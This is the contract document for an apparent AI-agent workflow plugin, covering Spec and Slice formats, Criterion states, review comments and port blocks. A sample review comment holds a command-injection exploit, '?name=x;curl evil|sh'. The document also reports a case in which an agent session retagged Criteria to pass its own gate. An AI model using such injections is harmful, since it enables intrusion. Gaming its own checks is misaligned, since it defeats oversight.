# Contracts

The shape of every artifact the slice workflow reads and writes, written down once.

A skill is free to change how it works. What it may not change unilaterally is the shape of what it
leaves behind, because another skill reads it. This document is that boundary. Read it to hand-write
a Spec or a Slice body that every skill in the plugin accepts, without
reading a single skill first.

It describes shapes, not skill behaviour. When you want to know what `/critique-spec` does, read
`/critique-spec`. When you want to know what it leaves on disk, read this.

Vocabulary is `CONTEXT.md`'s: Spec, Spec issue, Slice, Criterion, Seam, Critique, Verification.

## On this vocabulary

`CONTEXT.md` gives each term an _Avoid_ list. Those lists govern the words this document and the
skills choose when naming a concept. They do not reach inside a literal string that already exists
in the world. Four such strings appear below and are deliberate:

- **`## User Stories`** and **`## Acceptance criteria`** are section headings that Pocock's
  `/to-spec` and `/to-tickets` write. They are quoted here as the exact bytes a parser matches.
- **review comment** is a code review on a pull request. A Critique is a second model doubting a
  Spec before any Slice is built. Different artifacts, and the _Avoid_ entry exists to stop the
  second being called the first.
- **sub-issue** is GitHub's own name for an issue linked under another, and the _Avoid_ entries it
  brushes against (parent issue, child issue) govern what a Spec issue and a Slice may be called,
  not what GitHub calls its own link.
- **task list** is GitHub's own name for a `- [ ] #NN` block. It appears only where a Spec issue
  anchored before sub-issues were the roster still carries one.

A term this document introduces that is not in `CONTEXT.md` and not one of the above is a bug in one
of the two files.

## The Spec

### Where it lives

The Spec is the body of its Spec issue. There is no Spec file: nothing about a Spec is committed to
the repository, and changing one is an issue edit, never a pull request. ADR 0002 records why, and
what it replaced.

The Spec issue therefore carries everything at once: the Spec in its body, the labels, the
assignment and the closing references on the issue, and the Slices as its sub-issues. It stays
readable and editable after it closes, which is what keeps an `implemented` Spec anchored to the
code it describes.

**Every read and every header write goes through one script**, so the grammar below and the Status
transitions are enforced in one tested place:

```bash
python3 scripts/spec.py read 60                      # Status, Criteria, Verification, as JSON
python3 scripts/spec.py set-status 60 in-progress    # one transition, read back
python3 scripts/spec.py header 60 landed "#61, #62, 2026-09-24"
python3 scripts/spec.py list --status implemented    # every Spec at that Status, open or closed
```

Each takes `--repo {owner}/{name}` for a Spec tracked in another repository. It exits 1 on a body
that is not a Spec, a refused transition, or a write that did not read back, and 2 when `gh` fails.

A skill rewriting the prose or the Criteria, which only `/critique-spec` does,
reads the body immediately before editing it and writes it back with
`gh issue edit {n} --body-file -`. GitHub keeps every earlier version of a body in the issue's edit
history, which is the Spec's history.

### Shape

```markdown
**Status:** draft

## Problem Statement
## Solution
## User Stories
## Implementation Decisions
## Testing Decisions
## Out of Scope
## Further Notes

## Criteria

### C1
Given a cart holding one earn-eligible line
When the buyer submits the order
Then the loyalty ledger holds one credit row for that line, valued at 1 point per whole currency unit

### C2 [manual]
Given the rewards balance is 240 points
When the buyer opens the cart page
Then the balance renders in the cart summary as "240 points"

### C3
WHEN a request arrives with an unregistered client_id THE SYSTEM SHALL respond 401 within 200 ms

### C4 [command]
WHEN the ledger migration is submitted to the sandbox warehouse as a dry run THE SYSTEM SHALL accept it
Command: `uv run python scripts/dry_run.py --target sandbox migrations/ledger.sql`

## Verification

Command: `pnpm test:e2e loyalty`
```

The issue's title is the Spec's title. The seven middle sections are `/to-spec`'s output, left where
it published them. `/critique-spec` adds the header line above them and `## Criteria` and
`## Verification` below them, and changes nothing else `/to-spec` wrote.

The header is the lines above the first `## ` heading. A `**Status:**` line anywhere else is prose,
not a Status, and a body with no `**Status:**` line in its header is not a Spec.

### Verification takes one of two forms

Exactly one, never both:

- **Command form.** A line beginning `Command:` followed by a single runnable command. Run on a
  fresh checkout of the default branch after the last Slice merges.
- **Walkthrough form.** A line beginning `Walkthrough:` followed by numbered steps a person
  performs. Printed as the last thing the human is asked to do.

Command form is preferred wherever the feature can be proven that way.

### Lines that appear as the Spec moves

`**Status:**` is present from the first write. Two more join the header, each exactly one line, always in
the order Status, Critique, Landed, and each replacing its earlier self rather than repeating:

```markdown
**Status:** implemented
**Critique:** google (gemini-3.8-flash-high), #60 comment 2847193044, 2026-09-18
**Landed:** #61, #62, #63, 2026-09-24
```

- **Critique** names the critic that ran, a link to the comment holding its findings, and the date.
  The critic is `{vendor} ({model})`, taken from the entry of the Critics list that produced the
  findings and never from an earlier entry that was skipped or returned nothing. A `codex` entry
  configured as `default` records the word `default`, because that is what was passed.
  When the gate was skipped it instead holds the reason: `**Critique:** skipped, two-Criterion bug
  fix, 2026-09-18`.
- **Landed** lists every pull request that built the Spec, and the date the last one merged.

### A Spec names no file paths

Not in the Criteria, not in the Decisions, not anywhere. A path in a Spec is a promise about
structure that the next refactor breaks silently, and it is exactly what makes a Spec rot. Name
behaviour and name Seams.

The one exception is a runnable command: the Verification's `Command:` line, and the `Command:` line
of a `[command]` Criterion. A path inside a command does not rot silently. The first run after the
refactor fails, and says which path. `/review-pr` finds the Specs a diff touches by matching Spec
titles and `CONTEXT.md` terms against changed paths, which is why it needs no paths written down.

### Keeping an implemented Spec true

An `implemented` Spec describes code that ships, and stays that way. When `/review-pr` reports
spec drift, a diff changed behaviour an implemented Spec describes. The resolution is one of two,
and both are a person's call:

- **The change is intended.** Edit the Spec issue so it describes the new behaviour. Criterion ids
  are never renumbered: a Criterion the change retires is removed and leaves a gap, and one it
  adds takes the next unused id.
- **The change is not.** It is a bug in the diff.

Either way the fix to the Spec is an issue edit, never a commit, so it can be made the moment the
drift is found, and a drift finding never makes a pull request wait on a second pull request.

### A Spec anchored to a file under the old contract

A Spec issue whose body is a ``Spec: `docs/specs/…` `` pointer was anchored when the Spec lived in
a committed file. `spec.py` exits 1 on it and prints the fix, `spec.py migrate {n}`, which copies the
file's content into the issue body, keeping its Status and history, and leaves the file for the
founder to delete. No reader
falls back to the file.

## Status, and who writes each value

Five values. One skill owns each transition, so a reader always knows whether the Spec describes the
code or an intention. `spec.py set-status` refuses any transition this table does not give, and
walking a Status backwards with it.

| Status | Meaning | Written by | When |
| --- | --- | --- | --- |
| `draft` | Anchored, nobody has doubted it | `/critique-spec` | When it writes the Criteria and every critic failed |
| `critiqued` | A second model doubted it and the findings are resolved | `/critique-spec` | After the grilling round is applied |
| `in-progress` | At least one Slice is being built | `/dispatch-slices` | At the first fan-out |
| `implemented` | Every Slice landed and the Verification ran | `/merge-stack`, or `/merge-pr` for a single Slice | When the last Slice merges |
| `superseded` | A later Spec replaced it | by hand | Never automatically |

`/critique-spec` writes the Spec at `draft` and moves it to `critiqued` in the same run, so `draft`
persists only when no critic could run. `/critique-spec --skip-critique "<reason>"` is the one path
to `critiqued` without a critic, and it writes the reason into the Critique line. A person redoing a Critique sets
`critiqued` back to `draft`, the only backward step `spec.py` takes.

`/dispatch-slices` refuses to fan out a Spec still at `draft`.

The Status is a gate that anyone with write access to the tracker can open by editing the issue.
So was the file it replaced, for anyone with push access; a gate that holds against a teammate was
never the point. What the Status guarantees is that every skill reads and writes it the same way.

## A Spec's Slices are its sub-issues

The sub-issues of the Spec issue are the only roster of a Spec's Slices: every state, open and
closed, in the order GitHub lists them. GitHub's sub-issue view already shows each one's state,
assignee and progress, so nothing else in the body or on disk repeats the list.

`/to-tickets` links each Slice it publishes as a sub-issue of the Spec issue it was given, and
[references/ad-hoc-slice.md](references/ad-hoc-slice.md) links an ad hoc Slice the same way when it
belongs to an open Spec's area.

Every reader takes the roster from one script and never from the body:

```bash
python3 scripts/spec-slices.py 60
```

It pages through every sub-issue, and prints each Slice's number, title, tracker state (`OPEN` or
`CLOSED`), assignees, and `parent`: true when the Slice's `## Parent` names this Spec, so it may own
the Spec's Criteria. A lone Slice linked under the Spec is on the roster with `parent` false. It
holds the Spec open like any other Slice and owns none of its Criteria.

**The script stops, and so does every reader, when the sub-issues are not the whole roster:**

- **A `## Slices` task list entry that is not a sub-issue.** This is a Spec issue anchored before
  sub-issues were the roster. The list is never read as a fallback: a reader that took it would
  keep two rosters alive, and a reader that ignored it would see a Spec with no Slices, which
  close-out would read as every Slice closed.
- **An issue whose `## Parent` names the Spec but that is not a sub-issue.** `/to-tickets` published
  it without linking it.

The script names every such issue in one run, each with the `gh api` command that links it. Once
they are linked, the reader runs again. A `## Slices` list whose every entry is already a sub-issue
is not read, and the script notes once that it can be deleted from the body. An empty
`## Slices` heading is ignored.

## The Slice body

The sections the workflow reads. A hand-written Slice that carries them is indistinguishable from a
published one.

`/to-tickets` writes four of them: `## Parent`, `## What to build`, `## Acceptance criteria` and
`## Blocked by`. `## Seam` and `## References for context` are not in its template, so they arrive
by hand or not at all. `/create-bug` and `/create-feature` file lone Slices that carry every section but
`## Parent`, per [references/ad-hoc-slice.md](references/ad-hoc-slice.md).

That `## Seam` is absent from a published Slice is not a gap to be patched here. It is why
`/acceptance-tests` asks for the Seam rather than reading it: the one gate input the tracker cannot
be relied on to carry is the one a person is asked for.

```markdown
## Parent

#60

## What to build

{one paragraph of prose}

## Seam

{the public boundary the tests observe behaviour at}

## Acceptance criteria

- [ ] #60 C1 Loyalty ledger holds one credit row per earn-eligible line
- [ ] #60 C3 Unregistered client_id is rejected 401 within 200 ms
- [ ] #60 C4 [command] Sandbox dry run accepts the ledger migration

## References for context

- CONTEXT.md
- docs/adr/0001-specs-live-in-the-repo.md

## Blocked by

- None (can start immediately)
```

- **`## Parent`** holds the Spec issue reference, or is absent on a lone Slice. A Slice with one is
  also a sub-issue of that Spec issue; the section is for readers, and the link is the roster.
- **`## Seam`** names where the tests go. When it is absent, `/acceptance-tests` asks rather than
  guessing, because no test is written at an unconfirmed Seam.
- **`## Acceptance criteria`** is the literal heading `/to-tickets` writes, and it is the Slice's
  Criteria list. Each checkbox cites the Spec Criteria the Slice owns, in the form `#60 C1`, and one
  Criterion is owned by exactly one Slice. `/dispatch-slices` stops when a Spec Criterion is cited
  by no Slice, or a Slice checkbox cites no Spec Criterion. `/finalize-pr` ticks these.
- **`## Blocked by`** lists Slices that must merge first, or `None (can start immediately)`.

A missing section is skipped rather than fatal, except that `/dispatch-slices` needs the citations
and `/acceptance-tests` needs the Seam.

### A lone Slice with no Spec

A Slice built without a Spec numbers its own Criteria under its own issue number, and is held to the
same gate:

```markdown
## Acceptance criteria

- [ ] #74 C1 A malformed webhook payload is rejected 400 with the offending field named
- [ ] #74 C2 [command] The webhook schema passes the vendor check. Command: `pnpm vendor:check webhooks`
```

A lone Slice has no Spec to hold a `[command]` Criterion's command, so the checkbox carries it,
after the summary, as `Command:` and one backticked command.

Same grammar, same states in the review comment, same block on anything unverified. Skipping the
Spec is not a way to skip the tests.

## The Criterion grammar

### Ids

`C1`, `C2`, `C3`, in order, unique within one Spec. Never renumbered: a Criterion that is dropped
leaves a gap, because its id is already cited from a Slice, a test name, and a review comment.

Two forms:

| Form | Where |
| --- | --- |
| `C1` | Inside its own Spec |
| `#60 C1` | Cited from a Slice body, carried in a test name, or named in a review comment |
| `gr4vy/gr4ce#21 C4` | The same, where the Slice lives in a different repository than the pull request |

The cited form is `#<spec-issue-number> C<n>`, one space between. It is globally unique, which is
what lets `/finalize-pr` match a test to a Criterion across repositories and across time.

### When the tracker and the pull request are different repositories

A Slice may be tracked in one repository and built in another: the backend repository holds the
Specs and the Slices, the front end that implements them has its own repository, and the pull
request lands there. Everything above still holds, with the owner-qualified form carrying the
repository across.

**The repository is read, never assumed.** `gh pr view --json closingIssuesReferences` returns each
linked issue's `repository.owner.login` and `repository.name`, and every `gh issue` call a skill
makes about that Slice passes them as `--repo {owner}/{name}`. A bare `gh issue view 53` resolves
against the pull request's own repository, where issue 53 is a different issue or no issue at all.
Whether it errors or quietly reads the wrong body depends on what that number happens to be, which
is the worst of the two failures to rely on catching.

### Given/When/Then is the default

Three clauses, one per line, for any Criterion that describes behaviour:

```
Given a cart holding one earn-eligible line
When the buyer submits the order
Then the loyalty ledger holds one credit row for that line, valued at 1 point per whole currency unit
```

### EARS for constraints

A Criterion that is a constraint rather than a behaviour uses EARS, on one line:

```
WHEN a request arrives with an unregistered client_id THE SYSTEM SHALL respond 401 within 200 ms
```

The pattern is `WHEN <trigger> THE SYSTEM SHALL <behaviour>`. Use it when Given/When/Then would
force a fictional Given onto something that holds always: latency, a limit, an error code.

### Every Then is measurable

A Then that a reasonable reader could mark either way is not a Criterion. It resolves to pass or
fail or it is not done.

| Not measurable | Measurable |
| --- | --- |
| Then the page loads fast | Then the page reaches first contentful paint within 1.5 s |
| Then the error is handled gracefully | Then the response is 422 and names the rejected field |
| Then the balance is correct | Then the balance reads 240 points |

"Fast", "gracefully", "correct", "properly", "reasonable", "appropriate": each is a Then not yet
written.

### The `[manual]` tag

A Criterion a person must check carries `[manual]` immediately after its id, in the Spec and in the
Slice that cites it:

```
### C2 [manual]
Given the rewards balance is 240 points
When the buyer opens the cart page
Then the balance renders in the cart summary as "240 points"
```

The tag is the only thing that decides a Slice needs a person. `/dispatch-slices` classifies a Slice
as needing a human when and only when one of its Criteria carries the tag. No inference from labels,
no inference from wording. A Criterion is tagged because automating its check is not worth it, not
because it is hard to write.

`[manual]` means a person must check this, and nothing else. A check a session can run is never
`[manual]`, even when the session that reaches it cannot run it: that is a `[command]` Criterion
that was not run, below.

### The `[command]` tag

A Criterion proven by running a command rather than by a test carries `[command]` immediately after
its id, and names the command on a `Command:` line that closes the Criterion:

```
### C4 [command]
WHEN the ledger migration is submitted to the sandbox warehouse as a dry run THE SYSTEM SHALL accept it
Command: `uv run python scripts/dry_run.py --target sandbox migrations/ledger.sql`
```

It is for a check no test can carry an id for: a dry run against a sandbox, a schema or vendor
check, a build that must succeed. The command exits 0 exactly when the Then holds. One that can exit
0 with the Then false, a linter that only warns or a script that skips itself when a credential is
absent, is the wrong command.

| Where | What it carries |
| --- | --- |
| The Spec | `### C4 [command]`, and the `Command:` line as the Criterion's last line |
| A Slice citing the Spec | `- [ ] #60 C4 [command] {summary}`. The command is read from the Spec |
| A lone Slice | ``- [ ] #74 C2 [command] {summary}. Command: `{command}` `` |

The rules:

- **One tag at most.** A Criterion is `[manual]`, `[command]`, or untagged and proven by a test.
- **One command**, run from the root of the pull request's checkout, exactly as written.
- **Read-only.** It observes. It does not deploy, push, migrate a shared database, or write outside
  the checkout. A check that has to change shared state to prove anything is a person's to run, and
  is `[manual]`.
- **Not a gate `/finalize-pr` already runs.** Lint, typecheck, format and the test suite gate every
  pull request. A Criterion that restates them proves nothing about this Slice. A check the
  repository runs that `/finalize-pr` does not, such as a vendor check, is a fair `[command]`.
- **Not a reason for a person.** `/dispatch-slices` classifies a `[command]` Slice as AFK. When the
  command needs a credential the session lacks, the Criterion is reported as not run and blocks,
  and a person with the credential re-runs `/finalize-pr`. The tag does not change.

## The test name

A test proves a Criterion by carrying its id in its name, in the cited form:

```
test("#60 C1 loyalty ledger holds one credit row per earn-eligible line", ...)
```

The id is a prefix of the name. `/finalize-pr` matches on the literal `#60 C1`, so anything that
puts those bytes in the test's reported name works: a `describe` block wrapping several cases, a
parametrised case, a Python `def test_60_c1_...` with the id in its docstring where the runner
reports docstrings.

**Renaming an existing test to carry an id counts.** A Slice touching behaviour that is already
covered adds the id to the test that covers it rather than writing a second test for the same
behaviour.

One Criterion may be carried by more than one test. A test may carry more than one id when it
genuinely proves both.

## The frame

A frame is the image that proves a `[manual]` Criterion. It stands to a manual Criterion as a test
stands to an automated one: the Criterion names what a person would see, and the frame is what they
would have seen, captured from the code under review.

It exists because `manual` was the one state with no evidence. `verified` names a test's
`path:line`, `weak` names the code's, `unverified` names nothing and says so. `manual` named a
sentence telling a reviewer to go and look, which meant the reviewer built the branch, ran it, and
found their own way to the screen before they could disagree with anything.

### The name carries the id

A frame is named `{id-slug}-{short description}.png`, where the slug lowercases the cited form of
the id and collapses every run of characters that are not letters or digits to one hyphen:

| Cited id | Slug | A frame |
| --- | --- | --- |
| `#60 C2` | `60-c2` | `60-c2-cart-summary-balance.png` |
| `gr4vy/gr4ce#21 C4` | `gr4vy-gr4ce-21-c4` | `gr4vy-gr4ce-21-c4-citation-anchor.png` |

`/finalize-pr` matches the leading slug, which is the same literal match it already does on a test
name. The binding between a Criterion and its evidence is therefore a property of the filename, not
a judgement anybody makes at review time.

### Frames come from a manifest, never from improvisation

A repository that produces frames declares them in `docs/agents/frames.md`, beside
`issue-tracker.md`, `triage-labels.md`, `domain.md` and `workflow.md`. One serve line and one table:

```markdown
**Serve:** `pnpm --dir frontend build && pnpm --dir frontend preview --port {port} --strictPort`

| Criterion | Path | Viewport | Kind |
| --- | --- | --- | --- |
| gr4vy/gr4ce#21 C4 | /?scene=answer-citation | 1440x900 | still |
| gr4vy/gr4ce#21 C5 | /?scene=stream-stop | 1440x900 | filmstrip |
```

- **Serve** is one command that brings the built application up on a port it is given. `{port}` is
  substituted with the session's own preview port from the port block, so a fan-out of five Slices
  serves five applications at once without any of them choosing a port.
- **Path** is appended to `http://localhost:{port}`. It resolves to a scene: the screen rendered
  from fixtures the repository controls, never from a live tenant.
- **Viewport** is `{width}x{height}`, pinned so that a frame differs between two pull requests only
  where the interface differs.
- **Kind** is `still` for one image, or `filmstrip` for several captures of one scene stitched into
  one image. `filmstrip` is for behaviour that only exists over time, such as an answer arriving
  progressively. Video is not a kind: GitHub inlines an image and does not inline an `mp4`.

A manifest row is a declaration that this Criterion has a frame. That is what makes the gate
asymmetric, and the asymmetry is the whole design:

| Situation | What `/finalize-pr` does |
| --- | --- |
| The Criterion has a row, and the frame was captured | Reports `manual`, citing the frame |
| The Criterion has a row, and no frame came back | **Blocks.** A declared frame that did not get produced is a gate that did not run |
| The Criterion has no row | Reports `manual` with no frame, and does not block |
| The repository has no `frames.md` | Reports `manual` with no frame, and does not block |

Nothing here makes a repository produce frames. It makes a repository that said it would produce
one say so out loud when it did not, which is the same rule the quality gates are already held to.

### Where a frame lands

On an orphan branch named `ui-evidence` in the **pull request's own** repository, at
`pr-{number}/{frame}.png`, written through the contents API rather than committed from a worktree:

```bash
gh api -X PUT "repos/{owner}/{repo}/contents/pr-{number}/{frame}.png" \
  -f branch=ui-evidence -f message="frames for #{number}" -f "content=$(base64 -i {path})"
```

The branch is never merged, so the default branch stays free of binaries, and a reviewer with
access to the repository can open the image without a checkout, a download or a build. The pull
request's repository rather than the tracker's, because that is the repository a reviewer of this
diff already has open, and the one whose access already matches.

### A frame never changes a Criterion's state

A `[manual]` Criterion with a frame is still `manual`. A frame shows that something rendered; it
does not show that the behaviour holds, and the four states exist precisely because evidence that
falls short of a passing test used to get reported as though it did not. `[manual]` still wins over
every other state, and `/finalize-pr` still never blocks on `manual` itself.

### Scenes are fed fixtures, and nothing else

No tenant data, no live credential, no real card number, no session token on screen or in a URL a
frame captures. A frame is published to a branch and linked from a pull request, which puts anything
visible in it in front of everyone with repository access and leaves it in the history afterwards.

### A Slice whose Criteria carry no ids

Frames bind by id. A Slice whose checkboxes carry no ids has nothing for a manifest row to name, so
`/finalize-pr` reports that the frames step was skipped and why, and does not block. Add the ids, or
let `/acceptance-tests` write them back, and the step starts working.

## The four Criterion states in the `/finalize-pr` review comment

`/finalize-pr` reports every Criterion the Slice owns as exactly one of four states. The state is
what was proven, not what was attempted.

| State | Rule |
| --- | --- |
| **verified** | A test whose name carries the Criterion's id exists, and the test gate passed. For a `[command]` Criterion: its command exited 0 on the pull request's head |
| **weak** | Code in the diff appears to implement it, but no test carries the id. Never a `[command]` Criterion |
| **manual** | The Criterion carries `[manual]`; listed for the human to check, with its frame where it has one |
| **unverified** | Neither a test carrying the id nor identifiable code in the diff. For a `[command]` Criterion: its command failed, was not run, or is not named |

Shape in the comment:

```markdown
### Criteria

- verified    #60 C1 - `test/loyalty/earn.test.ts:14`, test gate green
- manual      #60 C2 - check the cart summary renders "240 points" - [frame](https://github.com/o/r/blob/ui-evidence/pr-64/60-c2-cart-summary-balance.png?raw=true)
- weak        #60 C3 - `src/auth/client.ts:88`, no test carries the id
- verified    #60 C4 - `uv run python scripts/dry_run.py --target sandbox migrations/ledger.sql` exited 0 on `3f9a2c1`, run by /finalize-pr
```

A `[command]` Criterion is the command, the head it ran on, and its result. The other outcomes:

```markdown
- verified    #60 C4 - `uv run python …` passed on `3f9a2c1` in CI check `dry-run` (https://github.com/o/r/actions/runs/123)
- unverified  #60 C4 - `uv run python …` exited 1 on `3f9a2c1`: `ERROR: column ledger.points_ref not found`
- unverified  #60 C4 - `uv run python …` not run: needs `SANDBOX_SA_KEY`, which this session does not have
```

A `[command]` Criterion is never `weak`. The command passed on this head or it did not, and code
that looks right is not a run. A command that was not run, for any reason, is `unverified` and
blocks, in every repository, test Seam or not. It is never reported as passed.

A CI check counts only when its workflow runs that exact command and the check ran on the pull
request's head. Otherwise `/finalize-pr` runs the command itself.

**verified is the only state that means the behaviour holds.** `weak` means there is code, which is
what "verified" used to mean and is why these four states exist.

`/finalize-pr` blocks on any `unverified`, in every repository, `[command]` Criteria included, and
never blocks on `manual`. It
blocks on a **declared frame that did not get produced**, which is a failed gate rather than a
judgement about the Criterion, and is reported as one.

`weak` blocks only where a **test Seam** exists: where the toolchain `/finalize-pr` detects exposes
a runnable test command, so there is a test the author could have written and did not. Where none
does, `/finalize-pr` has no test command to hold a Criterion to, and blocking would make every pull
request unmergeable forever rather than asking the author for anything.

The Criterion is still reported as `weak` either way. The test Seam changes what `weak` costs, never
what it is called, and the review comment names which of the two rules applied and why.

Red-before-green ordering is not checked. A test carrying the id and a green gate is the whole
contract.

Above ten Criteria on one Slice, `/finalize-pr` warns. It never blocks on the count.

### `/finalize-pr` never edits a Criterion

It ticks the checkbox of each `verified` Criterion on the Slice and changes no other byte of the
Slice body. Never a Criterion's text, never its id, never its tag, and never ids added to a Slice
that has none. The run holds every Criterion to the tag it found, and anything that looks wrong is
reported in the review comment and in the run's summary, for a person to fix on the tracker.

A skill that can retag a Criterion can pass its own gate, and the gate then proves nothing. Worked
example, from gr4vy/gr4ce#470: two Criteria were checks a session runs, a sandbox dry run of the SQL
and the repository's vendor check. No test could carry their ids, so the four states could only
call them `weak`, which blocks where there is a test Seam, or `[manual]`. The session retagged both
`[manual]` on the issue to clear the gate, though it had run both itself.

Under this contract, a Slice with an untagged Criterion like those reports:

```markdown
- weak        #60 C6 - `migrations/ledger.sql:1`, no test carries the id
ⓘ Tag: #60 C6 reads as a command ("dry_run.py against the sandbox accepts the SQL") and carries no tag. Tag it `[command]` with its `Command:` line on the tracker and re-run. This run held it to the untagged rule.
```

It blocks, and the body is untouched. Once a person tags it, the next run executes the command and
reports `verified` or `unverified` on what the command returned. The other things reported rather
than repaired:

| Found | Reported as |
| --- | --- |
| A Slice whose checkboxes carry no ids | `ⓘ Ids: the Slice's Criteria carry no ids, so no test can be matched to one` |
| A checkbox tag that disagrees with the Spec | `ⓘ Tag: #60 C4 is [command] in the Spec and [manual] on #62. The Spec wins; fix #62` |
| A `[command]` Criterion with no `Command:` line | `unverified`, with `no command named` as its evidence |
| A `[manual]` Criterion whose check is a command | `ⓘ Tag: #60 C2 is [manual] and its check is a command a session can run. Retag it [command]`. It is still reported `manual` |

The `/finalize-pr` review comment carries no code-review and no spec-drift section. Those belong to
`/review-pr`, which `/finalize-pr` hands a Not blocking PR to.

## The `/review-pr` summary comment

`/review-pr` posts one issue comment per run, never edits an earlier one, and is the only skill that
marks a PR ready. The first line, the `Head:`, `Reviewer:`, `Security:`, `Copilot:` and `Auto-fix:`
lines, and the `###` headings are read by machines; keep their spelling. `merge-gate.py` reads the
first line, `Head:` and `Auto-fix:` to decide whether a head was reviewed and which session to stop.

```markdown
## /review-pr — {Ready | Draft}

{Only when Copilot did not run on a Ready PR: "Copilot did not run: {why}."}

Head: `{the reviewed head commit, first 7}`
Reviewer: `{the project agent's frontmatter name, or code-review}` — {approved | changes_requested}, {C} Critical, {H} High
Security: `{vendor} ({model})` — {H} High, {M} Medium, {L} Low
Copilot: {requested by the repository's ruleset | requested by /review-pr | did not run: {why} | not requested: Draft}{; later passes: on push | ; later passes: none, the repository does not review on push}
Auto-fix: {[session_…](https://claude.ai/code/session_…) — {started | already watching} | not started: {why} | not started: Draft}

### Blocking findings
- High — `src/auth/client.ts:88` — the token is logged in plain text
- Security High — `api/export.py:41` — the `name` query parameter reaches a shell; exploit: `?name=x;curl evil|sh`
- (or "None.")

### Security findings (not blocking)
- Medium — `path:line` — {the vulnerability}; exploit: {scenario}
- (or "None.")

### Spec drift (advisory)
- #60 Loyalty earn and burn, {behaviour the diff changes}, `path:line`
- (or "None." / "No implemented Specs match the changed paths.")

### Outcome
{Marked ready. | Left as a draft: {why}. | Returned to draft: {why}.}

<details><summary>Full reviewer report</summary> … </details>
<details><summary>Full security report</summary> … </details>
```

The `Security:` line names the entry of the Security reviewers list that produced the security
review, never one that was skipped or returned nothing.

`Ready` means the reviewer named on the `Reviewer:` line and the security reviewer named on the
`Security:` line both reviewed the commit on the `Head:` line, nothing either found blocks, and the
PR read back as ready before the comment was posted. It does not mean Copilot is clean: Copilot
reviews a PR only once it is ready, and the Auto-fix session answers it after this comment is
posted. A later push needs a later summary: an earlier `Ready` says nothing about a commit it did
not see, and `/merge-pr` and `/merge-stack` refuse a head the latest summary does not name. That is
what stops an Auto-fix session's commits merging without the code and security reviews.

## The Auto-fix comment

The Auto-fix session `/review-pr` starts posts one comment each time it reaches an end state, from
the founder's account and labelled as written by Claude Code. The prompt that asks for it is
`references/autofix-instructions.md`.

```markdown
## Auto-fix — {Clean | Stopped at the pass cap | Stopped}

### Copilot passes
- `{reviewed commit, first 7}` — {N} threads — pushed `{commit, first 7}` (or "none")

### Declined
- {thread link} — {the reason}
- (or "None.")

### Still open
- {thread or check link}
- (or "None.")
```

It is a report, not a gate. `merge-gate.py` judges Copilot from the PR itself with
`clean-predicate.py`, never from this comment, so a session that never posts one cannot make a PR
look clean.

## The port block

A fan-out puts several sessions on one machine at the same time. Each has its own worktree, so they
cannot see each other's files, and that is the only isolation git can give them. The machine's
ports, its browser and its container names are shared, and every tool's default port is the same
number in every worktree.

A Slice owns ten ports, derived from its issue number the same mechanical way its worktree and its
branch are:

```
base = 20000 + (n mod 4000) * 10
```

| Port | What it serves |
| --- | --- |
| `base` | The application's dev server |
| `base + 1` | The preview server a frame is captured from |
| `base + 2` | The backend or API the application talks to |
| `base + 3` … `base + 9` | Anything else the Slice starts: an emulator, a worker, a debugger |

Slice `#62` owns `20620` through `20629`. Two issue numbers 4000 apart share a block, which is a
collision between two Slices that would have to be in flight at the same time four thousand issues
apart, and is accepted rather than worked around.

**No default port, ever.** `vite` on 5173, `uvicorn` on 8000 and a Firestore emulator on 8080 are
each one number in every worktree at once. A server started on its default port is started on
another Slice's port often enough that the first session to run wins and the rest report failures
that do not reproduce.

**A listening port outside your block belongs to another Slice.** Do not use it, do not kill it, do
not investigate it. The failure this replaces is not a collision, it is the reasoning that follows
one: a session finds a port taken, cannot explain it, and goes looking. Killing the process that
holds it takes a sibling's server down mid-Slice, and the sibling reports something nobody can
reproduce afterwards.

**Anything else the machine shares is held to the same rule**, by giving each session its own rather
than asking it to share carefully. A browser profile directory shared between sessions is a port by
another name.

`/dispatch-slices` computes the block and puts the resolved range in the session's prompt, so a
session is told its ports rather than deriving them. A Slice driven by hand in the main checkout has
the formula and its own issue number, which is the same answer.

## The per-repo workflow file

```
docs/agents/workflow.md
```

Beside `issue-tracker.md`, `triage-labels.md` and `domain.md`. Three settings, one line and two
lists, and nothing else:

```markdown
**Specs:** on

**Critics:**
1. codex, default
2. google, gemini-3.8-flash-high
3. claude, claude-opus-5

**Security reviewers:**
1. codex, default
2. google, gemini-3.8-flash-high
3. claude, claude-opus-5
```

### The Specs line

Whether this repository keeps Specs at all. Two values:

| Value | Meaning |
| --- | --- |
| `on` | The Spec half of the workflow runs: `/dispatch-slices` reads each Spec, gates on its Status and checks that every Criterion is owned |
| `off` | The repository keeps no Specs. Every Slice is a lone Slice, whatever its `## Parent` says |

**Absent means `on`.** A file written before this line existed, or a repository that never edited
it, keeps today's behaviour without touching the file.

`off` is a declaration about the repository, not about one run: it is true every time, and it lives
in a file a reviewer sees in a diff. Under it, every skill that reads `## Parent` reads it as absent.
`/dispatch-slices` runs no Status gate, no coverage check, writes no Status, and warns about no
Spec issue that is not a Spec; it names the declaration once in its confirmation instead. `/acceptance-tests`
and `/finalize-pr` number and report the Slice's own Criteria exactly as they do for a lone Slice,
under the same four states. Skipping the Spec is not a way to skip the tests.

The line switches the Spec gates off wholesale for a repository that has none. It does not let a
repository that does keep Specs choose which gates bind. That would be a mode, and there is none.

### The Critics list

Each entry is `{vendor}, {model}`. `/critique-spec` walks the list in order and runs the first entry
that can actually produce a Critique on this machine: an entry whose tooling is absent is skipped,
and so is one that runs and returns nothing.

- **The order is the repo's choice.** The list above is the default `/setup-workflow` writes, and it
  puts a different vendor's model ahead of Claude because doubting a Claude session's synthesis is
  the whole point of the gate.
- **The last entry is the floor and must name `claude`.** It is the only vendor that needs nothing
  installed, so it is the only one that can be relied on to run. A file whose last entry names any
  other vendor has no floor, and `/critique-spec` stops rather than discovering it halfway down the
  chain.
- **`default` in the model position** means let that vendor's wrapper choose. It is only meaningful
  for `codex`, whose plugin asks callers to leave `--model` unset unless a specific model was
  requested. A `google` or `claude` entry names a model.

The vendors `/critique-spec` knows how to dispatch, and what each needs before it will run:

| Vendor | CLI | Subagent | Also required |
| --- | --- | --- | --- |
| `codex` | `codex` | `codex:codex-rescue` | — |
| `google` | `agy` | `antigravity:agy-rescue` | the entry's model id appears in `agy models` |
| `claude` | none | a read-only agent type | — |

Adding a vendor the table does not list is not a matter of editing this file: `/critique-spec` stops
on a vendor it has no dispatch path for rather than guessing one.

### The Security reviewers list

The chain `/review-pr` walks for a PR's security review, and read by nothing else. It has the
Critics list's shape and its rules, and is a separate list so that spec critique and security
review can put vendors in different orders.

- **Each entry is `{vendor}, {model}`**, and `default` in the model position means the same as it
  does for Critics.
- **The vendors are `codex`, `google` and `claude`**, dispatched through the subagents and checked
